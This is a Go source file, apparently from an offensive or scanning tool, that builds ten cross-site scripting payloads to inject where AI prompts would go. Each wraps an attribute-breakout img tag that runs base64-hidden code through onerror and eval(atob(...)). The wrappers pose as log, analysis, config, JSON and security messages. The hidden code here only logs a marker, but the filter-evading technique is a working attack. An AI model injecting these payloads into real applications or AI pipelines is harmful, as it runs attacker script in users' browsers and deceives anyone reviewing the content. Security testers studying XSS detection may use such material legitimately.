package xss

// AIPrompt define una estructura para inyecciones de prompt (ahora con XSS)
type AIPrompt struct {
	Name    string
	Content string
}

// GetAIPrompts genera los payloads XSS para inyectar en lugar de prompts de IA
func GetAIPrompts(callbackURL string) []AIPrompt {
	// Payload XSS base (el mismo que se usa en xss_injection_everywhere.go)
	xssPayload := `"><img src=x id=Y29uc29sZS5sb2coIjExMjIzMzQ0Iik= onerror=eval(atob(this.id))>`

	return []AIPrompt{
		// 1. XSS Payload Principal
		{
			Name:    "Primary_XSS_Marker",
			Content: xssPayload,
		},

		// 2. XSS con contexto de log
		{
			Name:    "Log_XSS_Marker",
			Content: `[SYSTEM LOG] ` + xssPayload,
		},

		// 3. XSS con contexto de análisis
		{
			Name:    "Analysis_XSS_Marker",
			Content: `[ANALYSIS] ` + xssPayload,
		},

		// 4. XSS con contexto de evento
		{
			Name:    "Event_XSS_Marker",
			Content: `Event: ` + xssPayload,
		},

		// 5. XSS con contexto de configuración
		{
			Name:    "Config_XSS_Marker",
			Content: `[Config] Value=` + xssPayload,
		},

		// 6. XSS con contexto JSON
		{
			Name:    "JSON_XSS_Marker",
			Content: `{"data":"` + xssPayload + `"}`,
		},

		// 7. XSS con contexto de diagnóstico
		{
			Name:    "Diagnostic_XSS_Marker",
			Content: `[DIAGNOSTIC] ` + xssPayload,
		},

		// 8. XSS con contexto de seguridad
		{
			Name:    "Security_XSS_Marker",
			Content: `SECURITY: ` + xssPayload,
		},

		// 9. XSS con contexto de tarea
		{
			Name:    "Task_XSS_Marker",
			Content: `Task Result: ` + xssPayload,
		},

		// 10. XSS con contexto de validación
		{
			Name:    "Validation_XSS_Marker",
			Content: `Validation: ` + xssPayload,
		},
	}
}
